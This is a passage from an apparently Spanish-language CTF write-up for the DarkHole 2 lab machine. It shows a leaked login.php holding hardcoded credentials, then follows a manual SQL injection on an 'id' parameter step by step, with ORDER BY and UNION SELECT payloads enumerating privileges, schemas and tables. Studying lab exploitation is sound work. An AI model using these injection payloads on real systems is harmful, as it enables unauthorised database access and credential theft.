</span></span><span class=line><span class=cl>diff --git a/login.php b/login.php
</span></span><span class=line><span class=cl>index e69de29..8a0ff67 <span class=m>100644</span>
</span></span><span class=line><span class=cl>--- a/login.php
</span></span><span class=line><span class=cl>+++ b/login.php
</span></span><span class=line><span class=cl>@@ -0,0 +1,42 @@
</span></span><span class=line><span class=cl>+&lt;?php
</span></span><span class=line><span class=cl>+session_start<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>+require <span class=s1>&#39;config/config.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>+if<span class=o>(</span><span class=nv>$_SERVER</span><span class=o>[</span><span class=s1>&#39;REQUEST_METHOD&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=o>){</span>
</span></span><span class=line><span class=cl>+    <span class=k>if</span><span class=o>(</span><span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;email&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;lush@admin.com&#34;</span> <span class=o>&amp;&amp;</span> <span class=nv>$_POST</span><span class=o>[</span><span class=s1>&#39;password&#39;</span><span class=o>]</span> <span class=o>==</span> <span class=s2>&#34;321&#34;</span><span class=o>){</span>
</span></span><span class=line><span class=cl>+        <span class=nv>$_SESSION</span><span class=o>[</span><span class=s1>&#39;userid&#39;</span><span class=o>]</span> <span class=o>=</span> 1<span class=p>;</span>
</span></span><span class=line><span class=cl>+        header<span class=o>(</span><span class=s2>&#34;location:dashboard.php&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>+        die<span class=o>()</span><span class=p>;</span>
</span></span><span class=line><span class=cl>+    <span class=o>}</span>
</span></span><span class=line><span class=cl>+
</span></span><span class=line><span class=cl>+<span class=o>}</span>
</span></span><span class=line><span class=cl>+?&gt;
</span></span><span class=line><span class=cl>+
</span></span><span class=line><span class=cl>+&lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;style/login.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>+&lt;head&gt;
</span></span><span class=line><span class=cl>+    &lt;script <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;https://kit.fontawesome.com/fe909495a1.js&#34;</span> <span class=nv>crossorigin</span><span class=o>=</span><span class=s2>&#34;anonymous&#34;</span>&gt;&lt;/script&gt;
</span></span><span class=line><span class=cl>+    &lt;link <span class=nv>rel</span><span class=o>=</span><span class=s2>&#34;stylesheet&#34;</span> <span class=nv>href</span><span class=o>=</span><span class=s2>&#34;Project_1.css&#34;</span>&gt;
</span></span><span class=line><span class=cl>+    &lt;title&gt;Home&lt;/title&gt;</span></span></code></pre></div></figure></div><p>Vemos otras credenciales:</p><table><thead><tr><th>Username</th><th>Password</th></tr></thead><tbody><tr><td>root</td><td>darkhole_2</td></tr><tr><td>lush@admin.com</td><td>321</td></tr></tbody></table><p>Vemos que esto estaba en el <code>login.php</code>, vamos a ver si son vÃ¡lidas:</p><figure><img srcset=data:image/webp;base64,UklGRjQAAABXRUJQVlA4ICgAAACQAQCdASoQAAgAAph8J6QAAuWrwoAA/qN+Wk7EPboM2aNbc28IAAAA data-srcset="/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_1906x0_resize_q85_h2_lanczos_3.webp 1906w" data-sizes=auto src=/images/vlh/darkhole2/5_hu1d73534cb692ccb256bbf55f3809c9f8_210784_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1906 height=912 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Bien!! Me estoy finjando en un detalle que es el parÃ¡metro por <code>GET</code> <code>id</code> , vamos a probar a poner una comilla simple:</p><figure><img srcset="data:image/webp;base64,UklGRiQAAABXRUJQVlA4IBgAAAAwAQCdASoQAAcAAph8J6QAA3AA/vCjQAA=" data-srcset="/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_1913x0_resize_q85_h2_lanczos_3.webp 1913w" data-sizes=auto src=/images/vlh/darkhole2/6_hu19b8d4b9ca1b73b535a477b2729d8b2a_74130_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1913 height=872 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que la aplicaciÃ³n no carga. vamos a ver que cÃ³digo de estado devuelve:</p><figure><img srcset="data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAAAwAQCdASoQAAcAAph8J6QAA3AA/vAyJ2MwQYsxm9Xt+zNj0lAAAA==" data-srcset="/images/vlh/darkhole2/7_hub2cd579db9a5e34922fec5c765a3ae96_79828_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/7_hub2cd579db9a5e34922fec5c765a3ae96_79828_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/7_hub2cd579db9a5e34922fec5c765a3ae96_79828_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/7_hub2cd579db9a5e34922fec5c765a3ae96_79828_788x0_resize_q85_h2_lanczos_3.webp 788w" data-sizes=auto src=/images/vlh/darkhole2/7_hub2cd579db9a5e34922fec5c765a3ae96_79828_480x0_resize_q85_bgffffff_lanczos_3.jpg width=788 height=347 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vamos a emplear <code>ORDER BY</code> para filtrar por un nÃºmero de columnas hasta encontrar el exacto:</p><ul><li><code>' order by 100-- -</code>:</li></ul><figure><img srcset=data:image/webp;base64,UklGRi4AAABXRUJQVlA4ICIAAABwAQCdASoQAAcAAph8J6WR5AGIAAD+8DHx7rNNoBVIgAAA data-srcset="/images/vlh/darkhole2/8_hu6c557b89dd6c1927d40890916cf0eecc_86207_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/8_hu6c557b89dd6c1927d40890916cf0eecc_86207_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/8_hu6c557b89dd6c1927d40890916cf0eecc_86207_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/8_hu6c557b89dd6c1927d40890916cf0eecc_86207_810x0_resize_q85_h2_lanczos_3.webp 810w" data-sizes=auto src=/images/vlh/darkhole2/8_hu6c557b89dd6c1927d40890916cf0eecc_86207_480x0_resize_q85_bgffffff_lanczos_3.jpg width=810 height=351 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Era poco probable, vamos a bajarlo a <code>10</code>:</p><figure><img srcset="data:image/webp;base64,UklGRioAAABXRUJQVlA4IB4AAACwAQCdASoQAAcAAph8J6QAAudo3kAAAP7tmHkgAAA=" data-srcset="/images/vlh/darkhole2/9_hu0a32d5adc48160594a3499a5c9c259b6_84731_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/9_hu0a32d5adc48160594a3499a5c9c259b6_84731_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/9_hu0a32d5adc48160594a3499a5c9c259b6_84731_754x0_resize_q85_h2_lanczos_3.webp 754w" data-sizes=auto src=/images/vlh/darkhole2/9_hu0a32d5adc48160594a3499a5c9c259b6_84731_480x0_resize_q85_bgffffff_lanczos_3.jpg width=754 height=353 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Nadaâ€¦ vamos a ir probando <code>9,8,7â€¦</code> hasta que de otro cÃ³digo de estado:</p><figure><img srcset="data:image/webp;base64,UklGRjYAAABXRUJQVlA4ICoAAACQAQCdASoQAAcAAph8J6QAAuab25AA/ryfAcQgu2HnAmvKp2LN3ZwMAAA=" data-srcset="/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_1914x0_resize_q85_h2_lanczos_3.webp 1914w" data-sizes=auto src=/images/vlh/darkhole2/10_huf0f923bf465d12fc28d31c0d3a9d0391_357495_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1914 height=875 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que con <code>6</code> funciona, para probar vamos a poner <code>7</code>:</p><figure><img srcset="data:image/webp;base64,UklGRiYAAABXRUJQVlA4IBoAAAAwAQCdASoQAAoAAph8J6QAA3AA/vB5yXmgAA==" data-srcset="/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_1357x0_resize_q85_h2_lanczos_3.webp 1357w" data-sizes=auto src=/images/vlh/darkhole2/11_hu55429a1245aaf3bc6af499759696cc82_123765_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1357 height=835 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vale, ya conocemos el nÃºmero exacto de columnas que tiene la tabla. Vamos a emplear <code>UNION</code> para ver si se reflejan los â€œdatos basura":</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,2,3,4,5,6-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACwAQCdASoQAAcAAph8J6QAAueGekQAAP68nwLi06lRcClefFYAAA==" data-srcset="/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_1592x0_resize_q85_h2_lanczos_3.webp 1592w" data-sizes=auto src=/images/vlh/darkhole2/12_hu8e2e9ac1493757db751af5972bf86821_146946_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1592 height=697 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que noâ€¦ Ya que hay datos existentes y se reflejan primero. Vamos a probar a ir a <code>id=2</code>:</p><figure><img srcset=data:image/webp;base64,UklGRjQAAABXRUJQVlA4ICgAAACQAQCdASoQAAcAAph8J6QAAuUyTEAA/ryfAuGU/6BcORRlI/kAAAAA data-srcset="/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_1633x0_resize_q85_h2_lanczos_3.webp 1633w" data-sizes=auto src=/images/vlh/darkhole2/13_hufc466b63e0c2d19255438324caff7521_141663_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1633 height=687 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que aquÃ­ ya no hay datos, vamos a probar el <code>UNION</code>:</p><figure><img srcset=data:image/webp;base64,UklGRjQAAABXRUJQVlA4ICgAAACwAQCdASoQAAYAAph8J6QAAub1/vpAAP7AfzEkYKvo/7Nil0OAAAAA data-srcset="/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_1739x0_resize_q85_h2_lanczos_3.webp 1739w" data-sizes=auto src=/images/vlh/darkhole2/14_hu06f0870446c58ba391dcb322f6cb9742_143285_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1739 height=686 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos que se relfjan las columnas <code>2,3,5,6</code> y las columnas <code>1,4</code> no. Trabajaremos en la columna <code>2</code> ya que se refleja. Vamos a confirmar que el usuario que esta conectado a la db es <code>root</code> con la funciÃ³n <code>user()</code>:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,user(),3,4,5,6-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRiwAAABXRUJQVlA4ICAAAACQAQCdASoQAAMAAph8J6QAAudZtgAA/trXa5KeJ68AAA==" data-srcset="/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_1516x0_resize_q85_h2_lanczos_3.webp 1516w" data-sizes=auto src=/images/vlh/darkhole2/15_hu071b8ad31f6bf56862049a632e0956dc_56501_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1516 height=320 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vamos a ver si tenemos super privilegios en la base de datos, para ello usaremos la base de datos <code>mysql</code> y la tabla <code>user</code> apuntando a la columna <code>super_priv</code>:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,super_priv,3,4,5,6 from mysql.user-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRiwAAABXRUJQVlA4ICAAAACQAQCdASoQAAMAAph8J6QAAudP3WAA/s4Ho6xdC7AAAA==" data-srcset="/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_1516x0_resize_q85_h2_lanczos_3.webp 1516w" data-sizes=auto src=/images/vlh/darkhole2/16_hufc88071ff567fee1138a12de0bd9ff4f_53303_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1516 height=318 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>En este caso nos dice que <code>Y</code> que significa <code>Yes</code> asÃ­ que tenemos super privilegios en la base de datos. Vamos a intentar enumerar los privilegios que tenemos:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,grantee,privilege_type,4,5,6 from information_schema.user_privileges-- -</span></span></span></code></pre></div></figure></div><figure><img srcset=data:image/webp;base64,UklGRjQAAABXRUJQVlA4ICgAAACQAQCdASoQAAUAAph8J6QAAuTs3fgA/nk/Hwob53FurUhsNebAUsAA data-srcset="/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_1234x0_resize_q85_h2_lanczos_3.webp 1234w" data-sizes=auto src=/images/vlh/darkhole2/17_hubd47f355741298408fc82eaa835a66d8_87790_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1234 height=410 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Podemos fijarnos en 2 problemas:</p><ol><li>No vemos todos los resultados solo muestra la primera fila.</li><li>Estamos viendo los privilegios de otro usuario al que no estamos interesados</li></ol><p>Para ver todos los resultados vamos a usar <code>group_concat()</code> que lo que hace es concatenar todas las filas en 1:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,group_concat(grantee),3,4,group_concat(privilege_type),6 from information_schema.user_privileges where grantee=&#34;&#39;</span><span class=n>root</span><span class=s1>&#39;@&#39;</span><span class=n>localhost</span><span class=s1>&#39;&#34;-- -</span></span></span></code></pre></div></figure></div><p>Pero no nos mostrarÃ¡ nada. Vamos a enumerar la base de datos:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,schema_name,3,4,5,6 from information_schema.schemata-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRjgAAABXRUJQVlA4ICwAAACwAQCdASoQAAcAAph8J6QAAudgP8mAAPff6TxUWLDuu+tJCls62cWwFLAAAA==" data-srcset="/images/vlh/darkhole2/18_huc17e819e35a509a6e1685cc60f3033ea_44365_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/18_huc17e819e35a509a6e1685cc60f3033ea_44365_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/18_huc17e819e35a509a6e1685cc60f3033ea_44365_764x0_resize_q85_h2_lanczos_3.webp 764w" data-sizes=auto src=/images/vlh/darkhole2/18_huc17e819e35a509a6e1685cc60f3033ea_44365_480x0_resize_q85_bgffffff_lanczos_3.jpg width=764 height=322 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos solo mysql y es raro, vamos a usar group_concat:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata-- -</span></span></span></code></pre></div></figure></div><figure><img srcset=data:image/webp;base64,UklGRjQAAABXRUJQVlA4ICgAAACQAQCdASoQAAkAAph8J6QAAuTT9AAA/qN/f/5MAZFMwQ1mK+jYAAAA data-srcset="/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_1438x0_resize_q85_h2_lanczos_3.webp 1438w" data-sizes=auto src=/images/vlh/darkhole2/19_hu7e8c8ccaddf8034a598ff219eb384c02_140896_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1438 height=767 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vemos la base de datos <code>darkhole_2</code>, vamos a ver que db esta empleando actualmente:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,database(),3,4,5,6-- -</span></span></span></code></pre></div></figure></div><figure><img srcset=data:image/webp;base64,UklGRjoAAABXRUJQVlA4IC4AAADQAQCdASoQAAcAAph8J6QAAudkgufyAAD33+k8gbs9p07uaqfINH/WUI8huAAA data-srcset="/images/vlh/darkhole2/20_hu8e696bc3042bdede76fe503b33689497_53061_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/20_hu8e696bc3042bdede76fe503b33689497_53061_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/20_hu8e696bc3042bdede76fe503b33689497_53061_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/20_hu8e696bc3042bdede76fe503b33689497_53061_782x0_resize_q85_h2_lanczos_3.webp 782w" data-sizes=auto src=/images/vlh/darkhole2/20_hu8e696bc3042bdede76fe503b33689497_53061_480x0_resize_q85_bgffffff_lanczos_3.jpg width=782 height=346 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Vale, vamos a enumerar que tablas tiene la base de datos <code>darkhole_2</code>:</p><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,group_concat(table_name),3,4,group_concat(table_schema),6 from information_schema.tables where table_schema=&#39;</span><span class=n>darkhole_2</span><span class=s1>&#39;-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACQAQCdASoQAAUAAph8J6QAAudFx8AA/ryfAuLTqVF9nEo3MrYAAA==" data-srcset="/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_480x0_resize_q85_h2_lanczos_3.webp 480w,/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_576x0_resize_q85_h2_lanczos_3.webp 576w,/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_768x0_resize_q85_h2_lanczos_3.webp 768w,/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_1025x0_resize_q85_h2_lanczos_3.webp 1025w,/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_1200x0_resize_q85_h2_lanczos_3.webp 1200w,/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_1440x0_resize_q85_h2_lanczos_3.webp 1440w,/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_1570x0_resize_q85_h2_lanczos_3.webp 1570w" data-sizes=auto src=/images/vlh/darkhole2/21_hua880b3d9d4759ceee26f203e0165c486_125131_480x0_resize_q85_bgffffff_lanczos_3.jpg width=1570 height=500 decoding=async fetchpriority=auto loading=lazy alt class="lazyload blur-up"></figure><p>Existen 2 tablas:</p><ul><li><code>users</code></li><li><code>ssh</code>
Vamos a ver la tabla <code>users</code> a ver que columnas contiene:</li></ul><div class=expressive-code><figure class="frame not-content"><figcaption class=header><span class=title></span></figcaption><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; union select 1,group_concat(column_name),3,4,group_concat(table_name),group_concat(table_schema) from information_schema.columns where table_name=&#39;</span><span class=n>users</span><span class=s1>&#39; and table_schema=&#39;</span><span class=n>darkhole_2</span><span class=s1>&#39;-- -</span></span></span></code></pre></div></figure></div><figure><img srcset="data:image/webp;base64,UklGRjAAAABXRUJQVlA4ICQAAACQAQCdASoQAAYAAph8J5QAAuTqLAAA/vKd+n9IMMzp7nrgAAA=" data-srcset="/images/vlh/darkhole2/22_hu5b5d3225850e30eae61377cba197da5a_51740_480x0_resize_q85_h2_lanczos_3.webp 